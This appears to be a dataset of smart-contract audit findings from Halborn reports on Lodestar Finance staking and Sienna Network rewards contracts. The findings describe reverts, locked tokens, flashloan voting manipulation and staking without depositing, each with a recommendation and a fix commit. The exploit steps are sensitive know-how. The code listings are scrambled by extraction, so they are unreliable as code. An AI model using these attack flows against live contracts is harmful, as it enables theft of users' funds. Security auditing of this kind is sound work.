before, her lockTime is LODE tokens. 0, entering the if logic mentioned above. This means that her 100 VotingPower is burnt. Alice tries to unstake her 100 LODE token, but she cant as it 3. reverts with [FAIL. Reason: Burn amount exceeds voting power]. Contract is incorrectly trying to burn VotingPower that she does not have anymore, as it was already burnt before during the convertEsLODEToLODE() call. Proof of Concept: 40 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to not mint VotingPower when users stake for 10 seconds in the stakeLODE() function. Accordingly, the VotingPower should not be burnt when users unstake with a 0 or 10 lockTime in the unstakeLODE() function. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : b049afc3bf5635250033f03fc9e4684eb332d373. 41 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "UNSTAKELODE FUNCTION MAY REVERT UNDER CERTAIN CONDITIONS AS VOTING POWER IS INCORRECTLY BURNT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "During the re-assess of the new code introduced in the Commit ID b049afc3bf5635250033f03fc9e4684eb332d373 a new issue was found in the stakeLODE()-unstakeLODE() functions. Basically, the following flow would cause a revert Burn amount exceeds voting power during an unstakeLODE() function call: 1. Alice stakes 700 esLODE. She receives 700 VotingPower. 2. 2 weeks later, Alice calls convertEsLODEToLODE(). She converts 26,8 esLODE into LODE. Her VotingPower is burnt accordingly. She now has 673,2 VotingPower. 3. A few weeks later, Alice calls stakeLODE(1500, 10). She receives no voting power as she staked with a lockTime of 10. Although, the lockTime was not updated by the contract properly in the stakeLODE() function: Listing 7: StakingRewards.sol 308 if ( stakers [ msg . sender ]. lodeAmount == 0) { 309 310 311 } stakers [ msg . sender ]. startTime = block . timestamp ; stakers [ msg . sender ]. lockTime = lockTime ; When Alice called the stakeLODE() function, as she had previously called convertEsLODEToLODE(), her lodeAmount was >0, hence this code block was not entered. 4. Later on, Alice calls unstakeLODE() but it reverts with a Burn 42 amount exceeds voting power error. Why does this occurs? Because this code block is entered incorrectly during the unstakeLODE() call (as the lockTime was not properly updated before when she staked): Listing 8: StakingRewards.sol (Line 265) 263 // Adjust voting power 264 if ( lockTimePriorToUpdate != 10 seconds ) { 265 266 } votingContract . burn ( msg . sender , stLODEReduction ); As the contract tries to burn VotingPower that Alice does not have, it reverts, not allowing her to ever unstake her LODE tokens. Proof of Concept: 43 BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (10) Recommendation: It is recommended to update the lockTime variable when convertEsLODEToLODE () is called and the current lockTime of the user is 0. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : 97c84d98ef6011507183fcd37570084137b6626b. 44 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Critical"]}, {"title": "ESLODE TOKENS COULD GET LOCKED PERMANENTLY IN THE STAKINGREWARDS CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the StakingRewards contract, the function convertEsLODEToLODE() could totally lock the esLODE in the contract under certain circumstances. It was found that the following steps would lock Alices esLODE permanently in the contract: 1. Alice stakes 1000 esLODE. 2. On the day 250, Alice calls convertEsLODEToLODE(Alice) receiving 685 LODE tokens. 3. 115 days later (day 365), Alice stakes another 1000 esLODE, and then she calls convertEsLODEToLODE(Alice) receiving the remaining 315 LODE tokens. Lets remember, though, that now there is a new stake of another 1000 esLODE tokens. 4. 500 days later, Alice calls convertEsLODEToLODE(Alice) but it fails with ERROR: [FAIL. Reason: Arithmetic over/underflow]. Alices es- LODE tokens are now stuck in the StakingRewards contract. 45 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to fix the convertEsLODEToLODE() function logic to prevent this Denial of Service situation. Remediation Plan: SOLVED: The Lodestar team solved the issue by implementing the recommended solution. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. 46 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: High"]}, {"title": "VOTING POWER CAN BE MANIPULATED WITH A LODE FLASHLOAN AS STARTTIME VARIABLE IS ONLY UPDATED DURING THE INITIAL LOCK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "In the StakingRewards contract, the function stakeLODE() is used to stake LODE with or without a lock time to earn rewards: Listing 9: StakingRewards.sol (Line 77) */ * @param lockTime the desired lock time . Must be 10 seconds , 90 require ( amount != 0 , \" StakingRewards : Invalid stake amount \" ); require ( * @notice Stake LODE with or without a lock time to earn rewards * @param amount the amount the user wishes to stake ( denom . in 54 /* * 55 56  wei ) 57  days ( in seconds ) or 180 days ( in seconds ) 58 59 function stakeLODE ( uint256 amount , uint256 lockTime ) external  whenNotPaused nonReentrant { 60 61 62  == 180 days , 63 64 65 66 67 68 69 70  Cannot add stake with different lock time \" ); 71 72 ); uint256 currentLockTime = stakers [ msg . sender ]. lockTime ; uint256 startTime = stakers [ msg . sender ]. startTime ; uint256 unlockTime = startTime + currentLockTime ; require ( lockTime == currentLockTime , \" StakingRewards : \" StakingRewards : Invalid lock time \" if ( currentLockTime != 0) { lockTime == 10 seconds || lockTime == 90 days || lockTime } 47 if ( currentLockTime != 10 seconds && currentLockTime != 0) { require ( block . timestamp < unlockTime , \" StakingRewards : 73 74  Staking period expired \" ); 75 76 77 78 } } stakeLODEInternal ( msg . sender , amount , lockTime ); This stakeLODE() function internally calls the stakeLODEInternal() func- tion: Listing 10: StakingRewards.sol (Lines 91-94) } if ( lockTime == 90 days ) { uint256 mintAmount = amount ; } else if ( lockTime == 180 days ) { mintAmount = ( amount * stLODE3M ) / 1 e18 ; // Scale the mint mintAmount = ( amount * stLODE6M ) / 1 e18 ; // Scale the mint require ( LODE . transferFrom ( staker , address ( this ) , amount ) , \" 80 function stakeLODEInternal ( address staker , uint256 amount , uint256  lockTime ) internal { 81  StakingRewards : Transfer failed \" ); 82 83 84 85 86  amount for 3 months lock time 87 88  amount for 6 months lock time 89 90 91 92 93 94 95 96  amount 97  minted amount 98 99 100 101 102 103 stakers [ staker ]. startTime = block . timestamp ; stakers [ staker ]. lockTime = lockTime ; stakers [ staker ]. stLODEAmount += mintAmount ; // Update stLODE stakers [ staker ]. lodeAmount += amount ; // Update LODE staked UserInfo storage user = userInfo [ staker ]; if ( stakers [ staker ]. lodeAmount == 0) { uint256 _prev = totalSupply () ; totalStaked += amount ; } 48 104 105 106 107 108 109 110 111 112 113 updateShares () ; unchecked { user . amount += uint96 ( mintAmount ); shares += uint96 ( mintAmount ); } user . wethRewardsDebt = user . wethRewardsDebt + int128 ( uint128 ( _calculateRewardDebt ( accWethPerShare ,  uint96 ( mintAmount )) )); 114 115 116 117 118 _mint ( address ( this ) , mintAmount ); unchecked { if ( _prev + mintAmount != totalSupply () ) revert  DEPOSIT_ERROR () ; 119 120 121 122 } } emit StakedLODE ( staker , amount , lockTime ); Although, the stakeLODEInternal() only updates the stakers[staker]. Hence, startTime when the stakers[staker].lodeAmount is equal to 0. this flaw in the stakeLODEInternal() function logic can be abused to take a flashloan (if it was possible) of LODE, stake it, increase voting power, vote, unstake and repay the flashloan. 49 BVSS: AO:A/AC:L/AX:L/C:N/I:H/A:N/D:N/Y:N/R:N/S:U (7.5) Recommendation: It is recommended to always update the stakers[staker].startTime variable every time a user stakes. Remediation Plan: SOLVED: The Lodestar team solved the issue in the following Commit ID. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. The VotingPower logic was rebuilt and is now based on the OpenZeppelin Votes contract. 50 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: High"]}, {"title": "LODE LOCKING CAN BE BYPASSED ABUSING THE REWARDS SYSTEM", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lodestar_Finance_Staking_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "As mentioned in the previous issue, stakers[staker].startTime variable is only updated when the stakers[staker].lodeAmount is equal to 0. Based on this, the following exploit would be possible to get higher rewards without any risk: 51 1. User1 stakes 0.000000001 LODE with a 180 days lock and waits 180 days - 1 second. 2. User1 stakes 10000 LODE. 3. User2 stakes 10000 LODE. 4. Both users are generating the same rewards. Although User1 now can unstake his LODE at any given time, User2 needs to wait another 180 days which is not fair for the User2. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:H/R:N/S:U (7.5) Recommendation: As suggested in the previous issue, always update the stakers[staker]. startTime variable every time a user stakes. Remediation Plan: SOLVED: The Lodestar team solved the issue in the following Commit ID. Commit ID : aba53cfd19189720cb8c32368176648d6aead960. A different mitigation was chosen by Lodestar team. Users will not be able to re-stake if the cutoffTime was reached. This approach does not totally mitigate the issue, although the Lodestar team states that users will be informed of this logic, so it is a fair situation for all the stakers. 52 4.10 (HAL-10) RELOCKING FULL BONUS CAN BE OBTAINED AFTER A 10 SECONDS LOCK - HIGH (7.5) Commit IDs affected: - a21ecb23a4308c2602ac63ee86d576f78d73c6e6 ", "labels": ["Halborn", "Lodestar_Finance_Staking", "Severity: Informational"]}, {"title": "USERS CAN INCREASE THEIR STAKED TOKENS WITHOUT DEPOSITING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "A proof of concept video showing how to exploit this security issue is included in the report. As a consequence, malicious users can later completely claim / withdraw all accumulated rewards and staked LP tokens in reward pools. handle_receive_migration function in contracts/rewards/lib.rs allows users to increase without restrictions their amount of staked LP tokens in reward pools without depositing any token. It is important to mention that there is no need that reward pools are closed because this function can be called at anytime (and many times, too). D R A F T // for some reason it does not see Auth as implemented // Auth :: save_vk (& mut core , id . as_slice () , & vk ) ?; self . set_ns ( crate :: auth :: VIEWING_KEYS , id . as_slice () , & vk ) as_slice () ) ?; let id = self . canonize ( migrant . clone () ) ?; // Set the migrant ' s viewing key if let Some ( vk ) = vk { 215 fn handle_receive_migration (& mut self , env : Env , data : Binary ) -> 216 217 { 218 let ( migrant , vk , staked ): AccountSnapshot = from_slice (& data . StdResult < HandleResponse > The amount of staked LP tokens is increased without verifying the sender: Listing 1: contracts/rewards/lib.rs (Lines 228,229) Code Location: 219 220 221 222 223 224 225 226 ?; } // Add the LP tokens transferred by the migration 13 Update the logic of handle_receive_migration function to verify that the sender should be in the old reward pool and its address registered in the new reward pool (CAN_MIGRATE_FROM). 227 228 229 230 231 232 } Risk Level: Likelihood - 5 Impact - 5 Recommendation: Remediation plan: // to the migrant ' s new account Account :: from_addr ( self , & migrant , env . block . time )? . commit_deposit ( self , staked ) ?; HandleResponse :: default () . log (\" migrated \" , & staked . to_string () ) D R A F T SOLVED: The issue was fixed in commit 20dce5c6a7dfcd983ae2fbc4292b1b58678ae07e. 14 ", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Critical"]}, {"title": "REWARDS CANNOT BE CLAIMED WHEN REWARD POOLS ARE CLOSED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "According to the migration flow defined, once a reward pool is closed, users should be able to withdraw their stake and claim any remaining rewards. However, when users try to deposit, withdraw or claim in a closed reward pool, the function force_exit from contracts/rewards/algo.rs is called automatically. This function transfers staked LP tokens to users, but does not return remaining rewards. As a consequence, users will never be able to claim their rewards because when a reward pool is closed, it cannot be opened anymore. D R A F T let amount = self . staked ; let response = HandleResponse :: default () . msg ( RewardsConfig :: lp_token ( core ) ?. transfer (& self . & format! ( \" {} \" , when )) ? . log ( \" close_time \" , . log ( \" close_reason \" , & format! ( \" {} \" , why )) ?; address , amount ) ?) ? Listing 2: contracts/rewards/algo.rs (Lines 648,651) 644 fn force_exit (& mut self , core : & mut C) -> StdResult < HandleResponse > { if let Some (( ref when , ref why )) = self . total . closed { force_exit function transfers staked LP tokens to users, but does not return rewards: Code Location: self . commit_withdrawal ( core , amount ) ?; Ok ( response ) } else { errors :: pool_not_closed () 15 645 646 647 648 649 650 651 652 653 654 Risk Level: Likelihood - 4 Impact - 5 Recommendation: Remediation plan: Update the logic of force_exit function to transfer remaining rewards to users when a reward pool is closed. SOLVED: The issue was fixed in commit 6bb07ab9a720258fa1e19941397c5bb346186512. D R A F T 16 ", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: High"]}]